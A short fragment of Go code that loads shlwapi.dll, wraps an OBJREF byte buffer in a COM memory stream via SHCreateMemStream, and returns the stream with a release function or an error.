	shlwapiDLL := windows.NewLazySystemDLL("shlwapi.dll")
	procSHCreateMemStream := shlwapiDLL.NewProc("SHCreateMemStream")

	if procSHCreateMemStream.Find() == nil {
		stream, _, err := procSHCreateMemStream.Call(
			uintptr(unsafe.Pointer(&objrefData[0])),
			uintptr(len(objrefData)),
		)
		if stream == 0 {
			return 0, nil, fmt.Errorf("SHCreateMemStream: %v", err)
		}

		release := func() {
			comRelease(stream)
		}

		return stream, release, nil
	}

	return 0, nil, fmt.Errorf("SHCreateMemStream not available")
}
